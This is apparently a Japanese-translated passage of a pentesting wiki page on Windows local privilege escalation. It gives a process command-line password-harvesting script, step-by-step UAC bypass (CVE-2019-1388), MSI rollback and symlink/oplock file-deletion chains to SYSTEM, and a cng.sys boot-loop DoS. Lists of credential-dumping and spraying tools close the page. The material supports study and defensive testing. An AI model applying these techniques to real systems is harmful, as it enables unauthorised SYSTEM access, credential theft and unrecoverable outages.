ユーザーとしてシェルを得た場合、スケジュールされたタスクや他のプロセスがコマンドライン上で**パスワードを渡している**ことがあります。以下のスクリプトはプロセスのコマンドラインを2秒ごとに取得し、現在の状態を前回の状態と比較して差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（via console or RDP）にアクセスでき、UAC が有効になっている場合、いくつかの Microsoft Windows のバージョンでは、権限のないユーザーから "NT\AUTHORITY SYSTEM" のようなターミナルやその他のプロセスを実行することが可能です。

これにより、同じ脆弱性を使って escalate privileges と bypass UAC を同時に行うことが可能になります。さらに、何かをインストールする必要はなく、プロセスで使用される binary は署名され、Microsoft によって発行されています。

影響を受けるシステムの例は次の通りです:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、次の手順を実行する必要があります：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

この攻撃は基本的に、Windows Installer の rollback 機能を悪用して、アンインストール中に正当なファイルを悪意あるファイルに置き換えるものです。これには、攻撃者が `C:\Config.Msi` フォルダをハイジャックするために使用する **malicious MSI installer** を作成する必要があります。後に Windows Installer が他の MSI パッケージのアンインストール時に rollback ファイルを格納するためにこのフォルダが使用され、rollback ファイルが悪意あるペイロードを含むように改変されます。

要約すると手法は次の通りです:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI  
  - 書き込み可能なフォルダ（`TARGETDIR`）に無害なファイル（例：`dummy.txt`）をインストールする `.msi` を作成する。  
  - インストーラを **"UAC Compliant"** とマークし、**non-admin user** が実行できるようにする。  
  - インストール後にそのファイルの **handle** を開いたままにしておく。

- Step 2: Begin Uninstall  
  - 同じ `.msi` をアンインストールする。  
  - アンインストール処理はファイルを `C:\Config.Msi` に移動し、`.rbf` ファイルとしてリネームしていく（rollback のバックアップ）。  
  - `GetFinalPathNameByHandle` を使って、ファイルが `C:\Config.Msi\<random>.rbf` になったことを検出するために、開いているハンドルをポーリングする。

- Step 3: Custom Syncing  
  - `.msi` にはカスタムアンインストールアクション（`SyncOnRbfWritten`）が含まれており、`.rbf` が書き込まれたことを通知し、その後別のイベントが来るまで待機する。

- Step 4: Block Deletion of `.rbf`  
  - シグナルを受け取ったら、`FILE_SHARE_DELETE` なしで `.rbf` ファイルをオープンし、**削除をブロックする**。  
  - その後シグナルを返してアンインストールを完了させる。  
  - Windows Installer は `.rbf` を削除できず、すべての内容を削除できないため、**`C:\Config.Msi` は削除されない**。

- Step 5: Manually Delete `.rbf`  
  - 攻撃者が `.rbf` ファイルを手動で削除する。  
  - これで **`C:\Config.Msi` は空** になり、ハイジャック可能な状態になる。

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs  
  - 自分で `C:\Config.Msi` フォルダを再作成する。  
  - 弱い DACL（例: Everyone:F）を設定し、`WRITE_DAC` を付与したハンドルを開いたままにする。

- Step 7: Run Another Install  
  - 再度 `.msi` をインストールする。  
  - `TARGETDIR`: 書き込み可能な場所。  
  - `ERROROUT`: 強制的な失敗を引き起こす変数。  
  - このインストールは再び **rollback** を引き起こすために使われ、`.rbs` と `.rbf` を読み込む。

- Step 8: Monitor for `.rbs`  
  - `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待ち、そのファイル名を取得する。

- Step 9: Sync Before Rollback  
  - `.msi` にはカスタムインストールアクション（`SyncBeforeRollback`）が含まれており、`.rbs` が作成されたときにイベントをシグナルし、その後続行前に待機する。

- Step 10: Reapply Weak ACL  
  - `.rbs created` イベントを受け取った後、Windows Installer は `C:\Config.Msi` に強い ACL を再適用する。  
  - しかし、あなたはまだ `WRITE_DAC` を持つハンドルを保持しているため、再び弱い ACL を適用できる。  

> ACL は **ハンドルオープン時のみ適用される** ため、引き続きフォルダに書き込みが可能。

- Step 11: Drop Fake `.rbs` and `.rbf`  
  - `.rbs` ファイルを上書きして、Windows に以下を指示する偽の rollback スクリプトを配置する:  
    - あなたの `.rbf`（悪意ある DLL）を privileged な場所（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元する。  
    - 悪意ある SYSTEM レベルのペイロード DLL を含む偽の `.rbf` を落とす。

- Step 12: Trigger the Rollback  
  - 同期イベントをシグナルしてインストーラを再開させる。  
  - type 19 のカスタムアクション（`ErrorOut`）が既知の地点で意図的にインストールを失敗させるよう設定されている。  
  - これにより **rollback が開始** する。

- Step 13: SYSTEM Installs Your DLL  
  - Windows Installer はあなたの悪意ある `.rbs` を読み、ターゲット場所に `.rbf` DLL をコピーする。  
  - これで **SYSTEM によってロードされるパスに悪意ある DLL を配置** できる。

- Final Step: Execute SYSTEM Code  
  - 信頼された **auto-elevated binary**（例: `osk.exe`）を実行し、ハイジャックした DLL をロードさせる。  
  - **これであなたのコードが SYSTEM として実行される。**

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

前述の MSI rollback 手法は、`C:\Config.Msi` のような **entire folder** を削除できることを前提としています。しかし、脆弱性が **arbitrary file deletion** のみを許す場合はどうでしょうか？

NTFS の内部（**NTFS internals**）を利用できます：各フォルダには次のような隠しの代替データストリームが存在します:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームはフォルダの**インデックスメタデータ**を格納します。

つまり、フォルダの**`::$INDEX_ALLOCATION`ストリームを削除すると**、NTFSはファイルシステムからフォルダ全体を**削除します**。

この操作は、次のような標準的なファイル削除APIを使用して行えます:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* 削除 API を呼び出しているにもかかわらず、それは **フォルダ自体を削除します**。

### Folder Contents Delete から SYSTEM EoP へ
プリミティブが任意のファイル/フォルダを削除できないが、攻撃者が制御するフォルダの *contents* の削除を**許可している**場合はどうなるか？

1. Step 1: ベイト用のフォルダとファイルを準備する
- 作成: `C:\temp\folder1`
- その中に: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock は **実行を一時停止します**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. ステップ 3: SYSTEM プロセスをトリガーする (例: `SilentCleanup`)
- このプロセスはフォルダ (例: `%TEMP%`) をスキャンし、その内容を削除しようとします。
- `file1.txt` に到達すると、**oplockが発動し** コントロールをあなたの callback に渡します。

4. ステップ 4: Inside the oplock callback – 削除をリダイレクトする

- オプション A: `file1.txt` を別の場所へ移動する
- これは `folder1` を oplock を壊さずに空にします。
- 直接 `file1.txt` を削除しないでください — それをすると oplock が早期に解除されます。

- オプション B: `folder1` を **junction** に変換する：
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダのメタデータを格納するNTFS内部のストリームを対象としています — これを削除するとフォルダ自体が削除されます。

5. ステップ5: oplock を解除
- SYSTEM プロセスが続行し、`file1.txt` を削除しようとします。
- しかし現在は、junction + symlink のため、実際に削除されているのは:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダ作成から恒久的なDoSへ

**SYSTEM/adminとして任意のフォルダを作成できる**プリミティブを悪用する — たとえ**ファイルを書き込めない**、または**弱い権限を設定できない**場合でも可能。

**フォルダ**（ファイルではなく）を**重要な Windows ドライバ**の名前で作成する。例：
```
C:\Windows\System32\cng.sys
```
- このパスは通常 `cng.sys` カーネルモードドライバに対応します。
- もしそれを**フォルダとして事前作成**すると、Windowsは起動時に実際のドライバをロードできません。
- その後、Windowsは起動中に `cng.sys` をロードしようとします。
- フォルダを検出すると、**実際のドライバを解決できず**、**クラッシュあるいは起動停止**が発生します。
- 外部からの介入（例: ブート修復やディスクアクセス）がないと、**フォールバックはなく**、**回復できません**。

### 特権ログ/バックアップパス + OM symlinks から任意ファイル上書き / ブートDoS へ

**特権サービス**がログ/エクスポートを**書き込み可能な設定**から読み取ったパスに書き込む場合、そのパスを**Object Manager symlinks + NTFS mount points**でリダイレクトすることで、特権による書き込みを任意のファイル上書きに変換できます（SeCreateSymbolicLinkPrivilegeが**なくても**）。

**要件**
- ターゲットパスを保存する設定が攻撃者により書き込み可能であること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` へのマウントポイント作成とOMファイルシンボリックリンクを作成できること (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))。
- そのパスに書き込む特権操作（ログ、エクスポート、レポート）。

**攻撃チェーンの例**
1. 設定を読み取り、特権ログの出力先を復元する。例: `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` が `C:\ProgramData\ICONICS\IcoSetup64.ini` にある。
2. 管理者権限なしでそのパスをリダイレクトする:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待つ（例：管理者が「send test SMS」を実行）。書き込みは今 `C:\Windows\System32\cng.sys` に到達する。
4. 上書きされたターゲット（hex/PE parser）を検査して破損を確認する；再起動すると Windows は改ざんされたドライバパスを読み込むことを強制され → **boot loop DoS**。これは、特権サービスが書き込みのために開く任意の保護ファイルにも一般化できる。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` からロードされますが、もし `C:\Windows\System32\cng.sys` にコピーが存在する場合は先に試される可能性があり、破損データの信頼できる DoS sink になります。



## **High Integrity から SYSTEM へ**

### **新しいサービス**

もし既に High Integrity のプロセスで実行中であれば、**SYSTEM への道**は**新しいサービスを作成して実行すること**だけで簡単に得られることがある：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービス用バイナリを作成する際は、それが有効なサービスであるか、バイナリが必要な処理を実行することを確認してください。そうでない場合、20秒で強制終了されます。

### AlwaysInstallElevated

High Integrity プロセスから、**enable the AlwaysInstallElevated registry entries** を試み、_**.msi**_ ラッパーを使ってリバースシェルを **install** することができます。\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

もしそれらの token privileges を持っていれば（おそらく既に High Integrity プロセス内で見つかるでしょう）、SeDebug 特権を使って（protected processes を除き）ほとんどのプロセスを開き、そのプロセスの token をコピーして、その token で任意のプロセスを作成できます。\
この手法では通常、すべての token privileges を持つ SYSTEM として実行されているプロセスを選択します（はい、すべての token privileges を持たない SYSTEM プロセスも見つかります）。\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

この手法は meterpreter が `getsystem` を行う際に使用されます。手法は、パイプを作成し、そのパイプに書き込むためにサービスを作成／悪用することから成ります。パイプを作成した **server** が **`SeImpersonate`** 特権を使ってパイプクライアント（サービス）の token を impersonate できれば、SYSTEM 権限を取得できます。\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

もし SYSTEM として実行されている **process** によって **loaded** される dll を **hijack** できれば、その権限で任意のコードを実行できます。したがって Dll Hijacking はこの種の権限昇格にも有用であり、さらに high integrity process から達成する方がはるかに容易です。なぜなら dll をロードするフォルダに対する **write permissions** を持っているからです。\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## 追加情報

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windows のローカル権限昇格ベクターを探すための最適ツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 設定ミスや機密ファイルのチェック（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出済み。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの設定ミスをチェックして情報を収集（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 設定ミスのチェック**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, および RDP の保存されたセッション情報を抽出します。ローカル実行時は -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から資格情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン全体にスプレーします。**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- PowerShell ベースの ADIDNS/LLMNR/mDNS スプーファー兼中間者ツール。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な Windows 権限昇格の列挙**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の権限昇格脆弱性を検索（Watson に置換され非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(管理者権限が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の権限昇格脆弱性を検索（VisualStudio でのコンパイルが必要） ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- ホストを列挙して設定ミスを検索（情報収集ツール寄り、権限昇格用よりも情報収集向け）(コンパイルが必要) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くのソフトから資格情報を抽出します（GitHub にプリコンパイルされた exe あり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# 移植**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 設定ミスのチェック（実行ファイルは GitHub にプリコンパイル）。推奨しません。Win10 ではあまり動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能性のある設定ミスをチェック（python 由来の exe）。推奨しません。Win10 ではあまり動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿に基づいて作成されたツール（accesschk がなくても動作しますが、使用可能です）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み、利用可能なエクスプロイトを推奨します（ローカル python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み、利用可能なエクスプロイトを推奨します（ローカル python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

プロジェクトは正しいバージョンの .NET でコンパイルする必要があります（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている .NET のバージョンを確認するには次のようにします:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考資料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: カーネルの影の中の猫と鼠](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – SCADAシステムに存在する特権的ファイルシステムの脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [過去へのリンク。Windows上でのシンボリックリンクの悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
